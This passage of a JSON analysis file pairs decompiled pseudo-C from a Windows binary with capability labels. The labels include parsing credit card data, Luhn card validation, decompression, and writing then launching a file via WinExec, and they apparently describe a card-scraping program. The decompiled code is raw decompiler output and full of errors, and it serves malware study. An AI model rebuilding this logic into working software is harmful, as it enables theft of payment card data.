arg_ch * 2;\n            *piVar1 = (*piVar1 + 0x7b) - uVar5;\n            *(arg_8h + 0x33) = arg_10h;\n            *(puVar4 + -0x75) = *(puVar4 + -0x75) << 2;\n            arg_8h = arg_8h + arg_10h;\n            arg_10h = arg_8h >> 0x10;\n            if (arg_8h >> 0x10 != 0) {\n                arg_10h = arg_10h + (arg_8h & 0xffff);\n                arg_8h = arg_10h;\n            }\n            arg_ch = arg_ch + 1;\n            puVar4 = puVar4 + -1;\n        } while (puVar4 != NULL);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 611
    },
    "00404050": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004040da) overlaps instruction at (ram,0x004040d9)\n// \n\nvoid __cdecl fcn.00404050(int32_t arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint32_t extraout_ECX;\n    uint8_t extraout_DL;\n    uint8_t *unaff_EBX;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    bool in_CF;\n    bool in_ZF;\n    bool bVar6;\n    bool in_OF;\n    float10 extraout_ST0;\n    uchar uStack00000014;\n    uint32_t uStack00000015;\n    uint uStack00000019;\n    uint32_t uStack0000001d;\n    uint var_4h;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        if (!in_OF) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uStack00000015 = in_EAX & 0xffffff20;\n        uStack00000014 = uStack00000015 >> 0x18;\n        uStack00000019 = 0x407010;\n        uStack0000001d = uStack00000015;\n        (*_sym.imp.USER32.dll_RegisterClassExA)();\n        return;\n    }\n    uVar1 = fcn.00402ab0(0, arg_8h, arg_ch + 1U >> 1 & 0xffff | (arg_ch + 1U >> 0x11) << 0x10);\n    puVar4 = uVar1 & 0xffff;\n    bVar6 = (extraout_DL & unaff_EBX) < '\\0';\n    iVar2 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    if ((bVar6) || (!bVar6)) {\n        uVar1 = *(iVar2 + 0x58);\n    }\n    else {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        pcVar3 = puVar4 | *puVar4;\n        *pcVar3 = *pcVar3 + pcVar3;\n        uVar1 = extraout_ECX;\n        puVar4 = iVar2 + -0x1bf31dd6;\n    }\n    if (puVar4 < uVar1) {\n        iVar5 = (puVar4 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        iVar5 = puVar4 - (uVar1 & 0xffff);\n    }\n    if (iVar5 < uVar1 >> 0x10) {\n        iVar5 = (iVar5 - (uVar1 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar5 = iVar5 - (uVar1 >> 0x10);\n    }\n    iVar5 = iVar5 + arg_ch;\n    *arg_14h = iVar5;\n    if ((-1 < iVar5) && (-1 >= iVar5)) {\n        *(arg_8h + 0x1c) = extraout_ST0;\n    }\n    *arg_10h = *(iVar2 + 0x58);\n    return;\n}\n",
        "token_count": 774
    },
    "00402d20": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402d20(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x423750 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00404d00(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072fc, acStack1304, &uStack2112);\n    uStack2088 = 0x407384;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x40739c;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004041b0(auStack1564, 0x4072f8, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "00403940": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403d59) overlaps instruction at (ram,0x00403d56)\n// \n// WARNING: Removing unreachable block (ram,0x004039f5)\n\nuint8_t * fcn.00403940(void)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    int32_t *piVar3;\n    uchar uVar4;\n    code *pcVar5;\n    ushort uVar6;\n    ushort uVar7;\n    int16_t iVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    uint8_t *puVar12;\n    ushort *puVar13;\n    char extraout_CH;\n    uchar *extraout_ECX;\n    char extraout_CH_00;\n    char extraout_CH_01;\n    char extraout_CH_02;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    char extraout_DL;\n    uint8_t extraout_DL_00;\n    int32_t extraout_EDX;\n    uint8_t *puVar16;\n    uint32_t unaff_EBX;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint *unaff_EBP;\n    ushort *unaff_ESI;\n    uint *puVar19;\n    uint *puVar20;\n    uchar *unaff_EDI;\n    uchar *puVar21;\n    uint *puVar22;\n    uint *puVar23;\n    bool bVar24;\n    uint8_t in_AF;\n    bool bVar25;\n    char cVar26;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar27;\n    bool bVar28;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint64_t uVar29;\n    ulong uVar30;\n    uchar *in_stack_ffffffc0;\n    uchar *puStack32;\n    ushort uStack24;\n    ushort uStack22;\n    uint8_t uStack20;\n    uint8_t uStack19;\n    uint16_t uStack18;\n    ushort uStack16;\n    ushort uStack14;\n    ushort uStack12;\n    ushort uStack10;\n    \n    uStack12 = SUB42(unaff_EDI, 0);\n    uStack10 = unaff_EDI >> 0x10;\n    uStack16 = 0x11;\n    uStack14 = 0;\n    uStack20 = 0x28;\n    uStack19 = 0x70;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    fcn.004042d0();\n    cVar27 = SBORROW1(extraout_DL, 'Q');\n    cVar26 = extraout_DL + -0x51 < '\\0';\n    uStack16 = 0xf;\n    uStack14 = 0;\n    uStack20 = 0x44;\n    uStack19 = 0x72;\n    uStack18 = 0x40;\n    uStack24 = 0x13;\n    uStack22 = 0;\n    uVar29 = fcn.004042d0();\n    iVar9 = uVar29 >> 0x20;\n    iVar11 = iVar9;\n    if ((cVar27 == cVar26) && (cVar27 != cVar26)) {\n        cVar27 = SBORROW4(iVar9, 0x54681a6a);\n        cVar26 = iVar9 + -0x54681a6a < 0;\n        iVar11 = uVar29;\n        if (0x54681a69ffffffff < uVar29) goto code_r0x0040399d;\ncode_r0x004039dd:\n        unaff_EDI = in_stack_ffffffc0;\n        if (cVar27 != cVar26) {\n            unaff_ESI = unaff_ESI + -1;\n            puVar21 = unaff_EDI | unaff_EBP;\n            unaff_EDI = puVar21 + 1;\n            *puVar21 = iVar9;\n        }\n    }\n    else {\ncode_r0x0040399d:\n        pcVar1 = iVar11 + 0x13;\n        cVar27 = SCARRY1(*pcVar1, extraout_CH);\n        *pcVar1 = *pcVar1 + extraout_CH;\n        cVar26 = *pcVar1 < '\\0';\n        fcn.004042d0();\n        if ((!cVar27) && (cVar27)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar9 = fcn.004042d0();\n        in_stack_ffffffc0 = unaff_EDI;\n        if (cVar27 == cVar26) goto code_r0x004039dd;\n    }\n    fcn.004042d0();\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0x3f;\n    uStack19 = 0x3a;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0x72;\n    uStack19 = 0x3a;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    uStack24 = SUB42(unaff_EBP, 0);\n    uVar6 = uStack24;\n    uStack22 = unaff_EBP >> 0x10;\n    uVar7 = uStack22;\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0x9b;\n    uStack19 = 0x3a;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0xcb;\n    uStack19 = 0x3a;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0xe6;\n    uStack19 = 0x3a;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 1;\n    uStack19 = 0x3b;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0x33;\n    uStack19 = 0x3b;\n    uStack18 = 0x40;\n    iVar8 = fcn.004042d0();\n    bVar24 = false;\n    bVar28 = false;\n    bVar25 = iVar8 == unaff_EBX;\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0x4e;\n    uStack19 = 0x3b;\n    uStack18 = 0x40;\n    uVar30 = fcn.004042d0();\n    if ((bVar28) || (!bVar28)) {\n        uStack20 = 0xc;\n        uStack24 = 0x7348;\n        uStack22 = 0x40;\n        puVar21 = unaff_EDI;\n    }\n    else {\n        uVar4 = in(uVar30 >> 0x20);\n        *unaff_EDI = uVar4;\n        if (!bVar24 && !bVar25) {\n            puVar23 = &stack0x00004fae;\n            cVar26 = '\\x19';\n            do {\n                unaff_EBP = unaff_EBP + -1;\n                puVar23 = puVar23 + -1;\n                *puVar23 = *unaff_EBP;\n                cVar26 = cVar26 + -1;\n            } while ('\\0' < cVar26);\n            *uVar30 = *uVar30 + uVar30;\n            puStack32 = unaff_EDI;\n            goto code_r0x00403bb8;\n        }\n        uStack20 = 0x56;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*extraout_ECX, 0xbc);\n        puVar21 = unaff_EDI + 1;\n        puStack32 = unaff_EDI;\n        if (!bVar24) goto code_r0x00403bb8;\n    }\n    uStack18 = 0;\n    uStack19 = 0;\n    pcVar1 = (uVar30 >> 0x20) + 0x13;\n    *pcVar1 = *pcVar1 + (extraout_ECX >> 8);\n    fcn.004042d0();\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0xa6;\n    uStack19 = 0x3b;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    uStack16 = unaff_EBX;\n    uStack14 = unaff_EBX >> 0x10;\n    puStack32 = puVar21;\n    uStack24 = uVar6;\n    uStack22 = uVar7;\ncode_r0x00403bb8:\n    uVar7 = uStack14;\n    uVar6 = uStack16;\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0xcc;\n    uStack19 = 0x3b;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 8;\n    uStack19 = 0x3c;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    uVar17 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n    cVar27 = SBORROW4(uVar17, 0x222c);\n    cVar26 = uVar17 - 0x222c < 0;\n    bVar24 = uVar17 == 0x222c;\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0x3c;\n    uStack19 = 0x3c;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    if ((bVar24 || cVar27 != cVar26) || (!bVar24 && cVar27 == cVar26)) {\n        uStack20 = 4;\n        uStack19 = 0;\n        uStack18 = 0;\n    }\n    uStack24 = 0x7374;\n    uStack22 = 0x40;\n    fcn.004042d0();\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0x79;\n    uStack19 = 0x3c;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    bVar24 = (POPCOUNT(extraout_DL_00 & 0x66) & 1U) == 0;\n    uStack12 = 0x13;\n    uStack10 = 0;\n    uStack16 = 0x7014;\n    uStack14 = 0x40;\n    uStack20 = 0x9a;\n    uStack19 = 0x3c;\n    uStack18 = 0x40;\n    fcn.004042d0();\n    if ((bVar24) || (!bVar24)) {\n        uStack20 = 7;\n        uStack19 = 0;\n        uStack18 = 0;\n    }\n    else {\n        puVar2 = extraout_EDX + 7;\n        uVar17 = *puVar2;\n        uVar14 = *puVar2;\n        *puVar2 = *puVar2 - 0x68;\n        iVar11 = (*puVar2 < 0) * 0x80;\n        uStack19 = (in_NT & 1) * 0x4000 >> 8 | SBORROW4(uVar14, 0x68) * 0x800 >> 8 | (in_IF & 1) * 0x200 >> 8 |\n                   (in_TF & 1) * 0x100 >> 8 | iVar11 >> 8;\n        uStack20 = iVar11 | (*puVar2 == 0) * '@' | (in_AF & 1) * '\\x10' |\n                   ((POPCOUNT(*puVar2 & 0xff) & 1U) == 0) * '\\x04' | uVar17 < 0x68;\n        uStack18 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n        if (uVar17 >= 0x68) {\n            pcVar5 = swi(0x3d);\n            (*pcVar5)();\n            uStack12 = 0x26;\n            uStack10 = 0;\n            uStack16 = 0x73c4;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            fcn.004042d0();\n            bVar24 = false;\n            uStack12 = 8;\n            uStack10 = 0;\n            uStack16 = 0x73ec;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            fcn.004042d0();\n            if ((!bVar24) && (bVar24)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            fcn.004042d0();\n            uStack12 = 0xb;\n            uStack10 = 0;\n            uStack16 = 0x7410;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            fcn.004042d0();\n            uStack12 = 0x12;\n            uStack10 = 0;\n            uStack16 = 0x741c;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            fcn.004042d0();\n            bVar24 = false;\n            bVar25 = true;\n            pcVar1 = CONCAT22(uVar7, uVar6);\n            uStack12 = 0x12;\n            uStack10 = 0;\n            uStack16 = 0x7430;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            uVar30 = fcn.004042d0();\n            cVar26 = extraout_CH_01;\n            if ((!bVar24 && !bVar25) && (bVar24 || bVar25)) {\n                cVar26 = *pcVar1;\n                *(puStack32 + 0x6a) = *(puStack32 + 0x6a) - &uStack24;\n                cVar26 = (extraout_CH_01 - cVar26) + *(uVar30 + 0x44);\n                if (cVar26 == '\\0') {\n                    pcVar1 = pcVar1 + -0x7faeef3c;\n                    *pcVar1 = *pcVar1 + uVar30;\n                }\n            }\n            pcVar1 = (uVar30 >> 0x20) + 0x13;\n            *pcVar1 = *pcVar1 + cVar26;\n            fcn.004042d0();\n            uStack12 = 8;\n            uStack10 = 0;\n            uStack16 = 0x7448;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            fcn.004042d0();\n            uStack12 = 8;\n            uStack10 = 0;\n            uStack16 = 0x7450;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            fcn.004042d0();\n            uStack12 = 6;\n            uStack10 = 0;\n            uStack16 = 0x7458;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            fcn.004042d0();\n            uStack12 = 7;\n            uStack10 = 0;\n            uStack16 = 0x7460;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            fcn.004042d0();\n            uStack12 = 7;\n            uStack10 = 0;\n            uStack16 = 0x7468;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            fcn.004042d0();\n            uVar17 = CONCAT22(uVar7, uVar6);\n            uStack12 = 6;\n            uStack10 = 0;\n            uStack16 = 0x7470;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            iVar11 = fcn.004042d0();\n            cVar27 = SCARRY4(iVar11, 1);\n            cVar26 = iVar11 + 1 < 0;\n            uStack12 = 0x25;\n            uStack10 = 0;\n            uStack16 = 0x7478;\n            uStack14 = 0x40;\n            uStack20 = 0x13;\n            uStack19 = 0;\n            uStack18 = 0;\n            uStack24 = 0x7014;\n            uStack22 = 0x40;\n            uVar30 = fcn.004042d0();\n            puVar16 = uVar30 >> 0x20;\n            puVar12 = uVar30;\n            if (((cVar27 != cVar26) || (cVar27 == cVar26)) ||\n               (bVar24 = puVar16 != 0xa068086a,  puVar16 = puVar12,  bVar24)) {\n                puVar16[0x13] = puVar16[0x13] + extraout_CH_02;\n                puVar10 = fcn.004042d0();\n                return puVar10;\n            }\n            iVar11 = 0x23000048;\n            puVar23 = CONCAT13(uStack19, CONCAT12(uStack20, uStack22));\n            uVar14 = CONCAT22(uStack16, uStack18);\n            puVar20 = *0x23000058;\n            puVar16 = unaff_ESI;\n            do {\n                unaff_ESI = puVar10;\n                uVar14 = uVar15;\n                uVar17 = uVar18;\n                if (puVar12 < puVar16) {\n                    return NULL;\n                }\n                puVar13 = &uStack14;\n                if (puVar12 < unaff_ESI) {\n                    if (puVar12 < unaff_ESI) goto code_r0x00403fbd;\n                    puVar22 = puVar23 + 1;\n                    puVar19 = puVar20 + 1;\n                    *puVar23 = *puVar20;\n                    uVar18 = uVar17 & 0xffff0000 | CONCAT11(0xdf, uVar17);\n                    iVar11 = -0x751e7e30;\n                    puVar12[0x75cb3a1e] = puVar12[0x75cb3a1e] | uVar14;\n                    uVar15 = uVar14 + *(uVar18 + 0x7e8d144d);\n                    piVar3 = uVar15 - 0x73;\n                    iVar9 = *piVar3;\n                    *piVar3 = *piVar3 + uVar15;\n                    unaff_ESI = &uStack14;\n                    if (!SCARRY4(iVar9, uVar15)) goto code_r0x00403fcf;\n                    puVar23 = puVar23 + 5;\n                    bVar24 = *puVar19 == *puVar22;\ncode_r0x00403fd3:\n                    if (bVar24) {\n                        return puVar13;\n                    }\n                    puVar20 = *(iVar11 + 0x10);\n                    unaff_ESI = puVar13;\n                }\n                else {\ncode_r0x00403fbd:\n                    uVar15 = uVar14 & 0xffffff00 | *unaff_ESI;\n                    uVar18 = uVar17 & 0xffffff00 | *puVar20;\n                    if (*unaff_ESI == *puVar20) {\n                        puVar22 = puVar20 + 1;\n                        uVar15 = *(iVar11 + 0x14) - 1;\n                        puVar19 = unaff_ESI + 1;\ncode_r0x00403fcf:\n                        uVar18 = 0;\n                        bVar24 = true;\n                        do {\n                            puVar13 = unaff_ESI;\n                            puVar23 = puVar22;\n                            if (uVar15 == 0) break;\n                            uVar15 = uVar15 - 1;\n                            puVar23 = puVar22 + 1;\n                            bVar24 = *puVar19 == *puVar22;\n                            puVar19 = puVar19 + 1;\n                            puVar22 = puVar23;\n                        } while (bVar24);\n                        goto code_r0x00403fd3;\n                    }\n                }\n                puVar10 = unaff_ESI + 1;\n                puVar16 = puVar10;\n            } while( true );\n        }\n    }\n    *(extraout_EDX + 0x13) = *(extraout_EDX + 0x13) + extraout_CH_00;\n    uStack24 = 0x7014;\n    uStack22 = 0x40;\n    puVar10 = fcn.004042d0();\n    return puVar10;\n}\n",
        "token_count": 5666
    },
    "00403ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403ff0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402b60;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401000(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 119
    },
    "004011f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004012d0) overlaps instruction at (ram,0x004012ce)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004011f0(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint *in_FS_OFFSET;\n    bool bVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t *var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t *var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405230;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407410);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x40741c);\n    bVar8 = false;\n    piVar6 = NULL;\n    bVar9 = true;\n    uVar3 = 